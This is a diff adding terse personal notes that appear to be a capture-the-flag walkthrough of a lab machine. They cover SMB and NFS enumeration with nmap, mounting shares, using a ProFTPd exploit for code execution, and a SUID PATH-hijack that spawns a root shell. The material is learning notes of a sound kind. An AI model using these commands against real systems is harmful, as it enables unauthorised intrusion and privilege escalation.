@@ -1,0 +1,33 @@
+scan
+see samba, scan with nmap script
+nmap -p 445 --script="smb*" 10.10.58.222
+	or smbmap or smbclient
+mount anonymous share and read log
+
+smbclient //<ip>/anonymous
+sudo mount -r -t cifs //10.10.58.222/anonymous anon_mount
+smbget -R smb://10.10.58.222/anonymous
+
+see that nfs is on 111, scan with nmap
+nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmountnmap
+
+nc to get proftpd version
+look at exploit 36803.py rce
+
+nc to box to copy files (his ssh to /var)
+mount the nfs /var
+mount -t nfs <ip>:/<dir> <dst dir>
+
+search for suid
+find / -perm -u=s -type f 2>/dev/null
+see that it's calling things not by full path
+echo /bin/sh > curl
+chmod 777 curl 
+export PATH=/home/kenobi:$PATH
+
+
+lessons:
+we can update our path and the suid uses our path even though running as root. 
+
+
+
